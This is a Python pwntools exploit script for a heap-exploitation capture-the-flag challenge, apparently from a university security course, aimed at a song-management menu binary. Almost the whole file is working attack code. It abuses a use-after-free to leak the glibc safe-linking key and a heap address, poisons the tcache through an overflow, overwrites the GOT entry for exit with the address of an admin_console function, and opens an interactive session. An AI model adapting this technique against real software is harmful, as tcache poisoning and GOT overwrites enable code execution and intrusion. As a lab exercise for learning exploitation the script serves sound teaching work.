from pwn import *

binary = "./chal.bin_patched"

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

libc = ELF("libc.so.6")

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    if args.REMOTE:
        return remote("cse4850-tcache-1.chals.io", 443, ssl=True, sni="cse4850-tcache-1.chals.io")
    return process(e.path)

p = start()

def create(index, name):
    log.info(f"Creating song at index {index} with name {name}")
    p.sendlineafter(b'>>>', b'1')
    p.sendlineafter(b'>>>', str(index).encode('utf-8'))
    p.sendafter(b'>>>', name)

def edit(index, lyrics):
    log.info(f"Editing song {index} with lyrics {lyrics}")
    p.sendlineafter(b'>>>', b'2')
    p.sendlineafter(b'>>>', str(index).encode('utf-8'))
    p.recvuntil(b'song: ')
    song = p.recvline()[:-1]
    p.sendlineafter(b'>>>', lyrics)
    return song

def delete(index):
    log.info(f"Deleting song at index {index}")
    p.sendlineafter(b'>>>', b'3')
    p.sendlineafter(b'>>>', str(index).encode('utf-8'))

for i in range(10):
    create(i, chr(ord('A')+i).encode('utf-8')*0xf)
for i in range(10):
    delete(i)

key_leak = edit(0, b'A'*0xf)
key = u64(key_leak + (b'\0' * (8-len(key_leak))))
log.info(f"Key leaked as {hex(key)}")

cipher_leak = edit(1, b'B'*0xf)
addr = u64(cipher_leak + (b'\0' * (8 - len(cipher_leak)))) ^ key
log.info(f"Leaked address: {hex(addr)}")

create(0, b'A')
create(1, b'B')
delete(0)

payload = b'A'*0x78
payload += p64(0x91)
payload += p64(e.got['exit'] ^ key)
edit(1, payload)

create(0, b'A')
create(2, p64(e.symbols['admin_console']))

p.sendlineafter(b'>>>', b'4')

p.interactive()